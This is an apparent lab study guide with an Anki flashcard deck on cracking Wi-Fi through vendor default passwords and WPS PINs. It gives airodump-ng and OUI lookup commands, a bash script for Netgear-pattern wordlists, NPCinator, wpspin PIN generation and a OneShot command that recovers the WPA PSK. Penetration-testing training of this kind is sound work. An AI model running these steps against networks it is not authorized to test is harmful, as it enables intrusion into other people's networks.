# Chain #13: Default Credentials & Vendor-Based Cracking

## Goal & Scope

Exploit vendor default password schemes and WPS PIN logic to access Wi‑Fi networks:

- Identify vendor from SSID/BSSID.
    
- Apply known default password formats.
    
- Generate Netgear-style defaults with scripts and tools.
    
- Explore community resources for default generators.
    
- Generate and test default WPS PINs with wpspin.
    

---

## Step 1 — Identify Vendor via Reconnaissance

Run airodump‑ng to collect ESSID and BSSID of target:

```bash
airodump-ng wlan0mon -c 1 --essid HackTheBox-Wifi
```

Use OUI lookup to match vendor from MAC prefix:

```bash
grep -i "9C-C9-EB" /var/lib/ieee-data/oui.txt
```

Output example: `NETGEAR`.

---

## Step 2 — Why Vendor Lookup Matters

- Vendors often use predictable default password patterns.
    
- Knowing the brand narrows attack strategy.
    
- WPS algorithms may be vendor‑specific.
    

---

## Step 3 — Netgear Default Password Pattern

Default: `{adjective}{noun}{3 digits}`.  
Examples:

- `sleeksalamander113`
    
- `abandonedelephant556`
    

This pattern is guessable and exploitable.

---

## Step 4 — Public Netgear Wordlist Repository

Clone curated wordlist:

```bash
git clone https://github.com/LivingInSyn/netgear_hashcat_wordlist.git
cd netgear_hashcat_wordlist/wordlists
```

- Contains prebuilt Netgear‑style wordlists.
    
- Optimized for Hashcat use.
    

---

## Step 5 — Manually Building Netgear Wordlists

Custom Bash script combines adjectives, nouns, numbers:

```bash
#!/bin/bash
wordlist1="adjectives.txt"
wordlist2="nouns.txt"
wordlist3="numbers.txt"
output="Netgear_Default.txt"
> "$output"
while IFS= read -r adj; do
  while IFS= read -r noun; do
    while IFS= read -r num; do
      echo "${adj}${noun}${num}" >> "$output"
    done < "$wordlist3"
  done < "$wordlist2"
done < "$wordlist1"
```

- Flexible for testing different lists.
    
- Produces candidates like `brightwolf451`.
    

---

## Step 6 — Netgear Password Constructinator (NPCinator)

Community tool with larger adjective/noun pools:

```bash
python3 NPCinator.py > passwords.txt
```

- Generates extensive candidate lists.
    
- Must limit runtime to avoid gigabytes of output.
    

---

## Step 7 — Other Default Generators

Useful repos:

- **Smart Password Generator** → Based on salt, MAC, BSSID.
    
- **IMEI Generator** → For mobile broadband routers.
    
- **Time Warner/Spectrum Cracker** → Cable routers.
    
- **Wifi-WPA-Keyspace-List** → WPA keyspaces by vendor.
    

Maintain a toolkit of vendor‑specific generators.

---

## Step 8 — WPS Default PINs with wpspin

Generate default WPS PIN:

```bash
wpspin D4:BF:7F:EB:29:D2
```

Generate multiple possible PINs:

```bash
wpspin -A D4:BF:7F:EB:29:D2
```

Examples:

- `77215369` (24‑bit)
    
- `68175542` (Realtek)
    
- `12345670` (Cisco)
    

---

## Step 9 — Test WPS PIN with OneShot

```bash
python3 oneshot.py -i wlan0mon -b D4:BF:7F:EB:29:D2 -p 99956042
```

If successful:

- Displays `WPS PIN`.
    
- Reveals `WPA PSK` and `SSID`.
    

---

## Checklist

1. Capture target ESSID/BSSID with airodump‑ng.
    
2. Perform OUI vendor lookup.
    
3. Apply known vendor default patterns.
    
4. Use curated Netgear wordlists or scripts.
    
5. Optionally use NPCinator for larger lists.
    
6. Explore vendor default generators.
    
7. Generate WPS PINs with wpspin.
    
8. Test with OneShot/Reaver to retrieve PSK.
    

---

## Anki Deck:

```
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6

F1a2B3c4D5	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Why perform vendor lookup from SSID/BSSID before cracking?	Vendors often use predictable default password or WPS patterns, so identifying the vendor narrows cracking strategy.	wifi
G2b3C4d5E6	Basic (type in the answer)	Ops::WiFi Gym::Chain 13: Default Credentials	Which command finds vendor from BSSID <code>AA:BB:CC:DD:EE:FF</code> using local OUI data?	<code>grep -i "AA:BB:CC" /var/lib/ieee-data/oui.txt</code>	wifi
H3c4D5e6F7	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What Netgear default password pattern is known?	<code>{adjective}{noun}{3 digits}</code>	wifi
I4d5E6f7G8	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Give two examples of Netgear default passwords.	<code>sleeksalamander113</code>, <code>abandonedelephant556</code>	wifi
J5e6F7g8H9	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Which GitHub repository provides a Netgear Hashcat wordlist?	<code>https://github.com/LivingInSyn/netgear_hashcat_wordlist</code>	wifi
K6f7G8h9I0	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What does the provided Bash script do with adjectives, nouns, and numbers?	Generates a custom Netgear default password wordlist.	wifi
L7g8H9i0J1	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What tool expands adjective+noun pools into Netgear candidates?	Netgear Password Constructinator (NPCinator).	wifi
M8h9I0j1K2	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Why limit NPCinator runtime in labs?	It generates very large lists that can consume disk and CPU if left running too long.	wifi
N9i0J1k2L3	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Name four community default password generator repos.	Smart Password Generator, IMEI Generator, Time Warner/Spectrum Cracker, Wifi-WPA-Keyspace-List.	wifi
O1j2K3l4M5	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What tool generates default WPS PINs from BSSID?	<code>wpspin</code>	wifi
P2k3L4m5N6	Basic (type in the answer)	Ops::WiFi Gym::Chain 13: Default Credentials	Which <code>wpspin</code> flag enumerates multiple PIN candidates?	<code>-A</code>	wifi
Q3l4M5n6O7	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Give three example PINs produced by wpspin.	<code>77215369</code>, <code>68175542</code>, <code>12345670</code>	wifi
R4m5N6o7P8	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Which tool can verify a WPS PIN and extract the WPA PSK?	OneShot (or Reaver).	wifi
S5n6O7p8Q9	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What information does OneShot output upon success?	The WPS PIN, WPA PSK, and SSID of the target AP.	wifi
T6o7P8q9R0	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Why are default credentials a realistic attack vector in Wi-Fi?	Many users never change factory passwords or disable WPS, leaving predictable defaults exploitable.	wifi
U7p8Q9r0S1	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What is the advantage of using vendor-specific wordlists over rockyou.txt?	They directly target known default patterns instead of generic passwords, improving efficiency.	wifi
V8q9R0s1T2	Basic (type in the answer)	Ops::WiFi Gym::Chain 13: Default Credentials	What file is commonly used for vendor lookups on Linux systems?	<code>/var/lib/ieee-data/oui.txt</code>	wifi
W9r0S1t2U3	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Which WPA weakness does wpspin exploit?	Predictable vendor default WPS PIN generation algorithms.	wifi
X0s1T2u3V4	Basic (type in the answer)	Ops::WiFi Gym::Chain 13: Default Credentials	Which OneShot command tests PIN <code>99956042</code> against BSSID <code>D4:BF:7F:EB:29:D2</code> on interface <code>wlan0mon</code>?	<code>python3 oneshot.py -i wlan0mon -b D4:BF:7F:EB:29:D2 -p 99956042</code>	wifi
Y1t2U3v4W5	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What does NPCinator output by default and how is it used?	Generates Netgear-style candidate passwords and saves them for cracking attempts.	wifi
Z2u3V4w5X6	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Why is SSID naming pattern recognition useful?	Factory SSIDs often reveal vendor, guiding which default patterns to try.	wifi
A3v4W5x6Y7	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What two tools are typically used after generating default password candidates?	Hashcat for cracking and OneShot/Reaver for WPS PIN testing.	wifi
B4w5X6y7Z8	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	What risk comes with relying solely on default credential attacks?	They fail if user has changed defaults or disabled WPS.	wifi
C5x6Y7z8A9	Basic	Ops::WiFi Gym::Chain 13: Default Credentials	Explain why default Netgear password structure is both strong and weak.	It uses long words (strong entropy) but predictable pattern (weakness exploitable by attackers).	wifi
```